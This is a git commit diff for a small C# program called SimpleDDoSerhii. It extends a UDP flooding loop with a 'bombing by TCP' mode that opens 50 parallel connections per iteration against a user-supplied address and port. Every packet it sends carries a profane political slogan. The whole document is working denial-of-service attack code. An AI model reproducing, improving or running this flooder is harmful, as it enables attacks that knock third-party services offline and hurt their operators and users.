63d03eecbcd5c14f3886b829b91d888b1395ff22
usern0name <eric.usern0name@gmail.com>
2022-03-03 17:21:14 +0200

    Update Program.cs
    Added bombing by TCP

--- SimpleDDoSerhii/Program.cs
+++ SimpleDDoSerhii/Program.cs
@@ -10,39 +10,60 @@ namespace SimpleDDoSerhii
 {
     class Program
     {
-        static int Main(string[] args)
+        static void Main(string[] args)
         {
             try
             {
                 if (args.Length == 0)
                 {
                     Console.WriteLine("Empty arguments");
-                    return 1;
+                    return;
                 }
                 
                 var endPointAddress = args[0];
-                var destinationPort = string.IsNullOrEmpty(args[1]) ? 53 : int.Parse(args[1]);
-                var total = 0;
-                
+                var destinationPort = args.Length > 1 ? int.Parse(args[1]) : 53;
+                var protocol = args.Length > 2 ? args[2] : "UDP";
+
                 while (true)
                 {
-                    Up(endPointAddress, destinationPort, total);
-                    Console.WriteLine($"Sent to endpoint {endPointAddress}:{destinationPort} Total packets: {total}");
-                    total++;
+                    Up(endPointAddress, destinationPort, protocol);
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
-                throw;
             }
         }
 
-        private static void Up(string address, int port, int total)
+        private static void Up(string address, int port, string protocol)
         {
+            
             var data = Encoding.UTF8.GetBytes("russkiy voenniy korabl - idi na xuy");
-            var client = new UdpClient();
-            client.SendAsync(data, data.Length, address, port);
+            if (protocol.ToUpper().Equals("UDP"))
+            {
+                var client = new UdpClient();
+                client.SendAsync(data, data.Length, address, port);
+                Console.WriteLine($"{DateTime.Now.ToLongTimeString()}: Sent to endpoint {address}:{port} By protocol: {protocol}");
+            }
+            else
+            {
+                Parallel.For(0, 50, i =>
+                {
+                    try
+                    {
+                        var client = new TcpClient();
+                        client.ConnectAsync(address, port).Wait(10);
+                        client.Close();
+                        Console.WriteLine($"{DateTime.Now.ToLongTimeString()}: Sent to endpoint {address}:{port} By protocol: {protocol}");
+                    }
+                    catch (Exception e)
+                    {
+                    }
+                });
+                
+                
+            }
+
         }
     }
 }
